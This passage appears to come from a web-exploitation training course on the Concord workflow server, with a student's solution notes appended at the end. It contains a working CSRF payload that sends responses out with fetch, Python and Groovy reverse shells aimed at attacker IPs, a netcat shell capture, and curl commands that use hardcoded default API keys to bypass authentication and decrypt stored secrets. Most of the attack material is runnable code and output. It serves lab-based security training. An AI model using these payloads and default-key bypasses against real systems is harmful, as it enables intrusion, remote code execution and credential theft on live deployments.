      fetch("http://192.168.118.2/?msg=" + data )
   }).catch(err => {
      fetch("http://192.168.118.2/?err=" + err )
   });
}
Listing 20 - Post concord.yml

We'll start by creating a blob from the yml string with the content-type of "application/yml". This will not change the content-type header of the request, but will define the content-type in the form-data for fetch. Next, we'll create the form-data and append the concord.yml document. Once set up, we'll use fetch to send the appropriate request. We'll capture all responses and errors.

Finally, we'll need to edit the login check request we sent earlier to run the rce function when a user is authenticated.

...
	fetch("http://concord:8001/api/service/console/whoami", {
		credentials: 'include'
	})
	.then(async (response) => {
		if(response.status != 401){
			let data = await response.text();
			fetch("http://192.168.118.2/?msg=" + data );
			rce();
		}else{
			fetch("http://192.168.118.2/?msg=UserNotLoggedIn" );
		}
	})
...
Listing 21 - Using Fetch to Call whoami

Now that the payload is ready, we need to open a netcat listener to catch the shell. This should match the settings that we configured in our payload, including setting the port to 9000.

kali@kali:~$ nc -nvlp 9000
listening on [any] 9000 ...
Listing 22 - Starting Listener

We'll once again send our Kali IP to the user simulator. Once the simulation runs, we should find a new log entry in our HTTP server.

192.168.121.253 - - [07/Apr/2021 20:27:25] "GET / HTTP/1.1" 200 -
192.168.121.253 - - [07/Apr/2021 20:27:25] "GET /?msg={%20%20%22realm%22%20:%20%22apikey%22,%20%20%22username%22%20:%20%22concordAgent%22,%20%20%22displayName%22%20:%20%22concordAgent%22} HTTP/1.1" 200 -
192.168.121.253 - - [07/Apr/2021 20:27:25] "GET /?msg={%20%20%22instanceId%22%20:%20%22a85f6fef-69cb-4127-975c-9aa97584415e%22,%20%20%22ok%22%20:%20true} HTTP/1.1" 200 -
Listing 23 - Concord New Process Response

This new log entry contains the response the victim's browser received when a new process was added.

Our listener should also indicate that we caught a shell.

kali@kali:~$ nc -nvlp 9000
listening on [any] 9000 ...
connect to [192.168.118.2] from (UNKNOWN) [192.168.120.132] 39888
whoami
concord

ls -alh
total 28K
drwxr-xr-x 4 concord concord 4.0K Apr  8 00:27 .
drwx------ 3 concord concord 4.0K Apr  8 00:27 ..
drwxr-xr-x 2 concord concord 4.0K Apr  8 00:27 .concord
drwxr-xr-x 3 concord concord 4.0K Apr  8 00:27 _attachments
-rw-r--r-- 1 concord concord   36 Apr  8 00:27 _instanceId
-rw-r--r-- 1 concord concord  978 Apr  8 00:27 _main.json
-rw-r--r-- 1 concord concord  956 Apr  8 00:27 concord.yml
Listing 24 - Reverse Shell

Excellent! We now have RCE in Concord!

Exercises
We've left out some important options in the rce function that require the payload to work. Fix the payload to include the appropriate fetch options.
Add content to the HTML to make the page look more legitimate.
Build a payload in Python.
Build a payload in Ruby.
Extra Miles
Using the shell, add a new user to Concord and authenticate as the new user.

So far we have been using a version of Concord vulnerable to permissive CORS. As mentioned, the permissive CORS headers are not necessary for exploiting the CSRF vulnerability. SSH into the Concord server and run the following commands to stop the old version of Concord and start the newer version.

student@concord:~$ sudo docker-compose -f concord-1.43.0/docker-compose.yml down
Stopping concord1430_concord-agent_1  ... done
Stopping concord1430_concord-server_1 ... done
Stopping concord1430_concord-dind_1   ... done
Stopping concord1430_concord-db_1     ... done
Removing concord1430_concord-agent_1  ... done
Removing concord1430_concord-server_1 ... done
Removing concord1430_concord-dind_1   ... done
Removing concord1430_concord-db_1     ... done
Removing network concord1430_concord

student@concord:~$ sudo docker-compose -f concord-1.83.0/docker-compose.yml up -d
Creating network "concord1830_concord" with the default driver
Creating concord1830_concord-db_1 ... 
Creating concord1830_concord-dind_1 ... 
Creating concord1830_concord-db_1
Creating concord1830_concord-dind_1 ... done
Creating concord1830_concord-server_1 ... 
Creating concord1830_concord-server_1 ... done
Creating concord1830_concord-agent_1 ... 
Creating concord1830_concord-agent_1 ... done
Listing 25 - Starting Newer version of Concord

Using this newer version of Concord, change the payload and exploit the CSRF vulnerability.

1
(Walmart, 2021), https://concord.walmartlabs.com/docs/api/ ↩︎

2
(Walmart, 2021), https://concord.walmartlabs.com/docs/api/apikey.html ↩︎

3
(Mozilla, 2021), https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests ↩︎

4
(Walmart, 2021), https://concord.walmartlabs.com/docs/getting-started/security.html#using-api-tokens ↩︎

5
(Walmart, 2021), https://concord.walmartlabs.com/docs/processes-v1/index.html#directory-structure ↩︎

6
(Walmart, 2021), https://concord.walmartlabs.com/docs/processes-v1/index.html#dsl ↩︎

7
(Walmart, 2021), https://concord.walmartlabs.com/docs/getting-started/scripting.html ↩︎

8
(Lzone, 2021), https://lzone.de/cheat-sheet/YAML#yaml-heredoc-multiline-strings ↩︎

9
(frohoff, 2021), https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76 ↩︎


```
import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.200",9000));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")
```

##### Authentication Bypass: Round Two - Insecure Defaults
So far, we've demonstrated the power of CSRF and how it can lead to remote code execution. Due to modern browser updates, CSRF vulnerabilities are becoming more and more obsolete and we must find other authentication bypass vulnerabilities. Luckily for us, Concord is installed and configured with insecure defaults that lead to authentication bypass.

While the Concord version we've been using so far is also vulnerable to the insecure defaults we'll discover, we will focus on a newer version to demonstrate that it is also vulnerable to this approach. Let's download the code to our Kali VM and start the newer version of the application. We'll download the code with rsync, providing the -az flags to download as a compressed archive. We'll also provide the username and host (student@concord), the path to download (/home/student/concord-1.83.0/), and the download location (concord/).

kali@kali:~$ rsync -az student@concord:/home/student/concord-1.83.0/ concord/
student@concord's password: 
Listing 26 - Downloading the Source Code

As the code downloads, we'll ssh into the Concord server, stop the old version, and start the new version. Concord uses Docker1 to run the application, so we can use the docker-compose command to stop and start the application.

First we'll stop the old application with down, providing the appropriate docker-compose file with -f.

kali@kali:~/concord$ ssh student@concord
student@concord's password: 
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)
...

student@concord:~$ sudo docker-compose -f concord-1.43.0/docker-compose.yml down
[sudo] password for student: 
Stopping concord1430_concord-agent_1  ... done
Stopping concord1430_concord-server_1 ... done
Stopping concord1430_concord-dind_1   ... done
Stopping concord1430_concord-db_1     ... done
Removing concord1430_concord-agent_1  ... done
Removing concord1430_concord-server_1 ... done
Removing concord1430_concord-dind_1   ... done
Removing concord1430_concord-db_1     ... done
Removing network concord1430_concord
Listing 27 - Stopping Concord

Next, we'll start the new version, this time using the docker-compose.yml file located in the concord-1.83.0 folder. We'll use the up command to start the application, but add -d to run docker-compose in the background.

student@concord:~$ sudo docker-compose -f concord-1.83.0/docker-compose.yml up -d
Creating network "concord1830_concord" with the default driver
Creating concord1830_concord-dind_1 ... 
Creating concord1830_concord-db_1 ... 
Creating concord1830_concord-dind_1
Creating concord1830_concord-db_1 ... done
Creating concord1830_concord-server_1 ... 
Creating concord1830_concord-server_1 ... done
Creating concord1830_concord-agent_1 ... 
Creating concord1830_concord-agent_1 ... done
student@concord:~$ 
Listing 28 - Starting Concord

At this point, we should be running a newer version of Concord. We'll begin the vulnerability discovery by reviewing the code. More specifically, we'll review how the application is booted and installed. This process starts with the start.sh file in the server/dist/src/assembly/ folder.

kali@kali:~/concord$ cat server/dist/src/assembly/start.sh
#!/bin/bash

BASE_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"

MAIN_CLASS="com.walmartlabs.concord.server.dist.Main"
if [[ "${CONCORD_COMMAND}" = "migrateDb" ]]; then
    MAIN_CLASS="com.walmartlabs.concord.server.MigrateDB"
fi

...

exec java \
${CONCORD_JAVA_OPTS} \
-Dfile.encoding=UTF-8 \
-Djava.net.preferIPv4Stack=true \
-Djava.security.egd=file:/dev/./urandom \
-Dollie.conf=${CONCORD_CFG_FILE} \
-cp "${BASE_DIR}/lib/*:${BASE_DIR}/ext/*:${BASE_DIR}/classes" \
"${MAIN_CLASS}"
Listing 29 - Startup Script

While reviewing this file, we find that the application will run the class defined in the MAIN_CLASS variable. This variable can be set to either the Main class in com.walmartlabs.concord.server.dist or MigrateDb in com.walmartlabs.concord.server. Database migrations are used to initialize the application or update the applications database to the current version. They might configure the tables, columns, and insert data.

It's always a good idea to review the migrations to understand the database layout. The application may also leave sensitive data in these migrations from the development process.

As we search the code base for "MigrateDB", we discover the class declaration in server/impl/src/main/java/com/walmartlabs/concord/server/MigrateDB.java.

public class MigrateDB {

    @Inject
    @MainDB
    private DataSource dataSource;

    public static void main(String[] args) throws Exception {
        EnvironmentSelector environmentSelector = new EnvironmentSelector();
        Config cfg = new ConfigurationProcessor("concord-server", environmentSelector.select()).process();

        Injector injector = Guice.createInjector(
                new WireModule(
                        new SpaceModule(new URLClassSpace(MigrateDB.class.getClassLoader()), BeanScanning.CACHE),
                        new OllieConfigurationModule("com.walmartlabs.concord.server", cfg),
                        new DatabaseModule()));

        new MigrateDB().run(injector);
    }
...
}
Listing 30 - MigrateDB class

After reviewing this file, we find one of the classes referenced is DatabaseModule in server/db/src/main/java/com/walmartlabs/concord/db. The com/walmartlabs/concord/db part of the path is the class path. We typically won't find many files in the subpaths, but considering that there is a db folder in the path, we can assume this is used to manage the database. Let's navigate closer to the root of this folder (server/db/src/main/) and analyze the folder structure.

kali@kali:~/concord$ cd server/db/src/main/

kali@kali:~/concord/server/db/src/main$ tree
.
├── java
│   └── com
│       └── walmartlabs
│           └── concord
│               └── db
│                   ├── AbstractDao.java
│                   ├── DatabaseChangeLogProvider.java
...
└── resources
    └── com
        └── walmartlabs
            └── concord
                └── server
                    └── db
                        ├── liquibase.xml
                        ├── v0.0.1.xml
                        ├── v0.12.0.xml
...
Listing 31 - server/db/src/main Folder structure

The folder structure reveals that java contains the code and resources contains various XML documents, including liquibase.xml. An online search reveals the following about this file:

Liquibase is an open-source database schema change management solution which enables you to manage revisions of your database changes easily.

These must be the database migrations that include definitions for table names, columns, and data.

Let's review v0.0.1.xml to familiarize ourselves with the format.

The author, Ivan Bodrov, left his email in this public repository purposefully.

<?xml version="1.0" encoding="UTF-8"?>
<databaseChangeLog
        xmlns="http://www.liquibase.org/xml/ns/dbchangelog"
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://www.liquibase.org/xml/ns/dbchangelog http://www.liquibase.org/xml/ns/dbchangelog/dbchangelog-3.3.xsd">
...
    <!-- USERS -->

    <changeSet id="1200" author="ibodrov@gmail.com">
        <createTable tableName="USERS" remarks="Users">
            <column name="USER_ID" type="varchar(36)" remarks="Unique user ID">
                <constraints primaryKey="true" nullable="false"/>
            </column>
            <column name="USERNAME" type="varchar(64)" remarks="Unique name of a user (login)">
                <constraints unique="true" nullable="false"/>
            </column>
        </createTable>
    </changeSet>

...
</databaseChangeLog>
Listing 32 - Database Migration

This database migration shows the creation of the USERS table, which has two columns, USER_ID and USERNAME. This might not be the current state of the USERS table since future migrations might have added, removed, or renamed columns. However, this gives us an idea of the contents in the database.

Searching further in the same file, we find a database insert that piques our interest.

    <changeSet id="1440" author="ibodrov@gmail.com">
        <insert tableName="API_KEYS">
            <column name="KEY_ID">d5165ca8-e8de-11e6-9bf5-136b5db23c32</column>
            <!-- original: auBy4eDWrKWsyhiDp3AQiw -->
            <column name="API_KEY">KLI+ltQThpx6RQrOc2nDBaM/8tDyVGDw+UVYMXDrqaA</column>
            <column name="USER_ID">230c5c9c-d9a7-11e6-bcfd-bb681c07b26c</column>
        </insert>
    </changeSet>
Listing 33 - API Key in Migration

This entry in the migration file inserts an API key into the database. Earlier, we found in the documentation that we can use the Authorization header to authenticate with an API key. Let's try to authenticate a request using curl. We'll use the value in the API_KEY column as the Authorization header specified with the -H flag. We'll also use -i to show the response headers.

kali@kali:~$ curl -i -H "Authorization: KLI+ltQThpx6RQrOc2nDBaM/8tDyVGDw+UVYMXDrqaA" http://concord:8001/api/v1/apikey
HTTP/1.1 401 Unauthorized
Date: Fri, 09 Apr 2021 19:44:41 GMT
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: *
Access-Control-Allow-Headers: Authorization, Content-Type, Range, Cookie, Origin
Access-Control-Expose-Headers: cache-control,content-language,expires,last-modified,content-range,content-length,accept-ranges
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Expires: 0
Set-Cookie: rememberMe=deleteMe; Path=/; Max-Age=0; Expires=Thu, 08-Apr-2021 19:44:41 GMT
Content-Length: 0
Server: Jetty(9.4.26.v20200117)
Listing 34 - API key Unauthorized Response

Unfortunately, the response returned a 401 Unauthorized. However, API keys should be treated like passwords and hashed when stored, and the Concord developers mistakenly left an "original" value above the entry ("auBy4eDWrKWsyhiDp3AQiw"). Let's try to authenticate with this value using curl.

kali@kali:~$ curl -i -H "Authorization: auBy4eDWrKWsyhiDp3AQiw" http://concord:8001/api/v1/apikey
HTTP/1.1 401 Unauthorized
Date: Fri, 09 Apr 2021 20:06:37 GMT
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: *
Access-Control-Allow-Headers: Authorization, Content-Type, Range, Cookie, Origin
Access-Control-Expose-Headers: cache-control,content-language,expires,last-modified,content-range,content-length,accept-ranges
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Expires: 0
Set-Cookie: rememberMe=deleteMe; Path=/; Max-Age=0; Expires=Thu, 08-Apr-2021 20:06:37 GMT
Content-Length: 0
Server: Jetty(9.4.26.v20200117)
Listing 35 - Using "Original" API Key

This request also returns an Unauthorized response. Considering this is the first migration executed, it shouldn't come as a surprise that data might have changed. Other migrations might have deleted the entry or moved it. Let's grep for '<insert tableName="API_KEYS">' to determine if other migrations have inserted values into this table.

kali@kali:~/concord$ grep -rl '<insert tableName="API_KEYS">' ./
./server/db/src/main/resources/com/walmartlabs/concord/server/db/v0.70.0.xml
./server/db/src/main/resources/com/walmartlabs/concord/server/db/v0.69.0.xml
./server/db/src/main/resources/com/walmartlabs/concord/server/db/v0.0.1.xml
Listing 36 - Searching for API Key Entries

A search for this string resulted in three entries. We already reviewed v0.0.1.xml, so let's review v0.69.0.xml next.

<?xml version="1.0" encoding="UTF-8"?>
...
    <property name="concordAgentUserId" value="d4f123c1-f8d4-40b2-8a12-b8947b9ce2d8"/>

    <changeSet id="69000" author="ybrigo@gmail.com">
        <insert tableName="USERS">
            <column name="USER_ID">${concordAgentUserId}</column>
            <column name="USERNAME">concordAgent</column>
            <column name="USER_TYPE">LOCAL</column>
        </insert>
        
        <insert tableName="API_KEYS">
            <!-- "O+JMYwBsU797EKtlRQYu+Q" -->
            <column name="API_KEY">1sw9eLZ41EOK4w/iV3jFnn6cqeAMeFtxfazqVY04koY</column>
            <column name="USER_ID">${concordAgentUserId}</column>
        </insert>
    </changeSet>

</databaseChangeLog>
Listing 37 - Reviewing v0.69.0.xml

In this migration, we discover that an API_KEYS table entry is inserted for the concordAgent user. Considering that this migration is sixty-eight revisions ahead of the previous migration, this value is more likely to still be present in the database. Let's attempt to use this API key with curl. This time, we'll start with the value commented out above the entry.

kali@kali:~/concord$ curl -H "Authorization: O+JMYwBsU797EKtlRQYu+Q" http://concord:8001/api/v1/apikey
[ {
  "id" : "4805382e-98bc-11eb-a54f-0242ac140003",
  "userId" : "d4f123c1-f8d4-40b2-8a12-b8947b9ce2d8",
  "name" : "key-1"
} ]
Listing 38 - Curl with Newly Discovered API Key

Excellent! We were able to successfully find a default user that was mistakenly left in by the developer and not regenerated during installation.

The Concord documentation states that it's possible to log in with an API token by appending "?useApiKey=true" to the login URL.

Figure 25: Login Via API Key
Figure 25: Login Via API Key
Let's try to log in to the UI using this API Key.

Figure 26: Successful Login
Figure 26: Successful Login
Using the API key, we were able to log in!

Soln for Obtain RCE with a curl request using the newly-discovered API key:
```
curl -F concord.yml=@concord.yml http://concord:8001/api/v1/process -vv -H "Authorization: O+JMYwBsU797EKtlRQYu+Q"
```
concord.yml
```
configuration:
  dependencies:
  - "mvn://org.codehaus.groovy:groovy-all:pom:2.5.2"
flows:
  default:
    - script: groovy
      body: |
         String host = "192.168.45.204";
         int port = 9000;
         String cmd = "/bin/sh";
         Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
         Socket s = new Socket(host, port);
         InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
         OutputStream po = p.getOutputStream(), so = s.getOutputStream();
         while (!s.isClosed()) {
         while (pi.available() > 0) so.write(pi.read());
         while (pe.available() > 0) so.write(pe.read());
         while (si.available() > 0) po.write(si.read());
         so.flush();
         po.flush();
         Thread.sleep(50);
         try {
            p.exitValue();
            break;
         } catch (Exception e) {}
         };
         p.destroy();
         s.close();

```

```
https://github.com/walmartlabs/concord-website/blob/master/docs/api/process.md

```
```
try with

flows:
    default:
    - log: "${text}"
 
configuration:
    arguments:
      text: ${crypto.decryptString("vyblrnt+hP8GNVOfSl9WXgGcQZceBhOmcyhQ0alyX6Rs5ozQbEvChU9K7FWSe7cf")}

and

curl -F project=AWAE -F org=OffSec -F concord.yml=@decrypt.yml http://concord:8001/api/v1/process -vv -H "Authorization: O+JMYwBsU797EKtlRQYu+Q"

```
That curl command will create org and project.

Then need to run following to update project to accept raw payload.

```
curl -vv -X POST -H "Authorization: auBy4eDWrKWsyhiDp3AQiw" -H 'Content-Type: application/json' --data '{"name":"AWAE", "description": "AWAE project", "rawPayloadMode":"EVERYONE"}' http://concord:8001/api/v1/org/OffSec/project
```

Then run this curl command and check log from UI:
```
curl -F project=AWAE -F org=OffSec -F concord.yml=@decrypt.yml http://concord:8001/api/v1/process -vv -H "Authorization: O+JMYwBsU797EKtlRQYu+Q"
```

Log:
```
12:37:47 [INFO ] Using entry point: default
12:37:47 [INFO ] Enqueued. Waiting for an agent (requirements=null)...
12:37:49 [INFO ] Acquired by: Concord-Agent: id=df49f73a-cb34-11ee-8211-0242ac120003
12:37:49 [INFO ] Downloading the process state...
12:37:49 [INFO ] Process state download took 97ms
12:37:49 [INFO ] Runtime: concord-v1
12:37:49 [INFO ] Resolving process dependencies...
12:37:51 [INFO ] Dependencies: 
	mvn://com.walmartlabs.concord.plugins.basic:concord-tasks:1.43.0
	mvn://com.walmartlabs.concord.plugins.basic:slack-tasks:1.43.0
	mvn://com.walmartlabs.concord.plugins.basic:http-tasks:1.43.0
12:37:59 [INFO ] Process status: RUNNING
12:38:00 [INFO ] c.w.concord.plugins.log.LoggingTask - Džemujem ja stalno ali nemam džema
12:38:01 [INFO ] Process finished with: 0
12:38:01 [INFO ] Process status: FINISHED
```





Once project, org is present and rawpayloadmode is enabled, then following will work.
                  
┌──(kali㉿kali)-[~/web-300/concord]
└─$ cat test.py  
import requests

def decrypt_content(target, port, api_key):
    # http://concord:8001/api/v1/process
    yaml_payload = """
flows:
  default:
  - log: "Hello, ${name}"

configuration:
  arguments:
    name: ${crypto.decryptString("vyblrnt+hP8GNVOfSl9WXgGcQZceBhOmcyhQ0alyX6Rs5ozQbEvChU9K7FWSe7cf")}"""
    # ${{crypto.decryptString('vyblrnt+hP8GNVOfSl9WXgGcQZceBhOmcyhQ0alyX6Rs5ozQbEvChU9K7FWSe7cf')}}
    # ${crypto.decryptString("4d1+ruCra6CLBboT7Wx5mw==")}

    r = requests.post(f"http://{target}:{port}/api/v1/process",
                      headers={"Authorization": api_key},
                      #data={"project": "AWAE", "org": "OffSec"},
                      files={'concord.yml': ("blob", yaml_payload, "application/yml")},
                      proxies={"http": "http://127.0.0.1:8080"})
    print(r.json())

decrypt_content("concord", 8001, "Gz0q/DeGlH8Zs7QJMj1v8g")
                                                                                                                       
